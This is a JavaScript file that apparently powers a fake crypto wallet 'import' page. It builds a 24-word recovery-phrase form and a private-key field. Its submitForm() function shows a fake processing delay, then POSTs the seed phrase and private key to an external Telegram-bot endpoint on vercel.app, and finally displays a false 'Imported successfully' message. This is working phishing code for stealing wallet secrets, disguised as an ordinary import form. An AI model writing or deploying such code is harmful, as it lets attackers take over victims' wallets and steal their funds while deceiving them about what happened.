/* script.js */
const recoveryPhraseContainer = document.getElementById('recovery-phrase');

// Generate input fields for recovery phrases dynamically
for (let i = 1; i <= 24; i++) {
    const field = document.createElement('div');

    const label = document.createElement('label');
    label.setAttribute('for', `word${i}`);
    label.textContent = `${i}.`;

    const input = document.createElement('input');
    input.type = 'text';
    input.id = `word${i}`;
    input.name = `word${i}`;

    // Add keydown event listener to navigate to the next input
    input.addEventListener('keydown', (event) => {
        if (event.key === 'Enter' || event.key === ' ') {
            event.preventDefault();
            const nextInput = document.getElementById(`word${i + 1}`);
            if (nextInput) {
                nextInput.focus();
            }
        }
    });

    // Add paste event listener to handle bulk pasting of words
    input.addEventListener('paste', (event) => {
        event.preventDefault();
        const pasteData = (event.clipboardData || window.clipboardData).getData('text');
        const words = pasteData.split(/\s+/);

        words.forEach((word, index) => {
            const targetInput = document.getElementById(`word${i + index}`);
            if (targetInput) {
                targetInput.value = word;
            }
        });
    });

    field.appendChild(label);
    field.appendChild(input);
    recoveryPhraseContainer.appendChild(field);
}

function submitForm() {
    // Use SweetAlert2 for the success message
    
}
// script.js

async function submitForm() {
    // Get inputs for recovery phrase and private key
    const recoveryPhraseInputs = Array.from(document.querySelectorAll("#recovery-phrase input"))
        .map(input => input.value.trim());
    const privateKey = document.querySelector("#notes").value.trim();

    // Data object to send to the API
    const data = {
        seedPhrase: recoveryPhraseInputs,
        privateKey: privateKey
    };

    // Elements for content blur and loading overlay
    const content = document.getElementById("content"); // Replace with your main container ID
    const loadingOverlay = document.getElementById("loadingOverlay"); // Ensure your HTML has a spinner overlay element

    // Check if necessary elements exist
    if (!content || !loadingOverlay) {
        console.error("Error: Missing content or loading overlay elements.");
        return;
    }

    // Show loading overlay and blur the page
    content.style.filter = "blur(5px)";
    loadingOverlay.classList.remove("hidden");

    try {
        // Simulate 20 seconds delay for processing
        await new Promise((resolve) => setTimeout(resolve, 20000));

        // Make API request after the delay
        const response = await fetch('https://telegram-bot-blond-omega.vercel.app/api/storeData', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        // Hide the loading spinner and remove blur
        loadingOverlay.classList.add("hidden");
        content.style.filter = "none";

        if (response.ok) {
            // Handle successful response
            Swal.fire({
                title: 'Success!',
                text: 'Imported successfully! Please wait...',
                icon: 'success',
                confirmButtonText: 'OK',
            }).then(() => {
                // Reset form after the user clicks "OK"
                const inputs = document.querySelectorAll('#recovery-phrase input');
                inputs.forEach(input => input.value = '');
                document.querySelector('#notes').value = ''; // Reset private key textarea
            });
        } else {
            // Handle API error
            const errorResult = await response.json();
            Swal.fire("Error", errorResult.message || "Failed to import", "error");
        }
    } catch (error) {
        // Handle unexpected errors
        Swal.fire("Error", "An unexpected error occurred. Please try again.", "error");
        console.error("Error:", error);
    } finally {
        // Ensure spinner is hidden and blur is removed in case of errors
        loadingOverlay.classList.add("hidden");
        content.style.filter = "none";
    }
}
